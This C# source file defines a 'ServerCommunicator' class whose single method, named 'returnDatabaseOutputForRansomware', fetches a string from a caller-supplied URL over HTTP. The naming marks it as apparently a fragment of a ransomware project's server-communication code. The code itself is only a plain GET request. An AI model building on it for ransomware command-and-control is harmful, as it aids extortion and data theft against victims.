using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace DatabaseCollector
{
    class ServerCommunicator
    {
        private static readonly HttpClient client = new HttpClient();

        public static string returnDatabaseOutputForRansomware(string commandLine)
        {
            var responseString = client.GetStringAsync(commandLine).Result;

            return responseString;
        }
    }
}
